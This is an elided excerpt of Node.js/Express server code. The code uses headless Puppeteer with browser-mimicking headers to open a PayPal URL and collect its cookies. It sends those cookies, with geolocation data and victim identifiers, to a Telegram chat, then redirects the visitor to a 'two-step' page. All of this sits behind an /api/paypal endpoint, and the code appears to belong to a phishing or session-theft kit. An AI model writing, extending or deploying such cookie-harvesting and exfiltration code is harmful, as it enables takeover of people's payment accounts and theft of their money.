...
async function sendToTelegram(paypalCookies, userTag, examNumber, geoInfo, url) {
    const message =
...
// Fetch PayPal cookies with Puppeteer
async function fetchPayPalCookies(paypalUrl, userTag, examNumber) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
            executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome', // Render-compatible
        });
        ...
        // Set extra headers to mimic a browser
        ...
        // Navigate to PayPal URL with error handling
        ...
        // Send to Telegram
        await sendToTelegram(cookieString || "No cookies found", userTag, examNumber, geoInfo, paypalUrl);

        return { success: true, cookies: cookieString, redirectUrl: `${TWO_STEP_URL}?userTag=${encodeURIComponent(userTag)}` };
    } catch (err) {
        console.error("Puppeteer error:", err);
        const geoInfo = await getGeoInfo();
        await sendToTelegram(`Failed to fetch PayPal: ${err.message}`, userTag, examNumber, geoInfo, paypalUrl);
...
// API endpoint to fetch PayPal cookies
app.get('/api/paypal', async (req, res) => {
    ...
    const result = await fetchPayPalCookies(paypalUrl, userTag, examNumber);
    res.json(result);
});
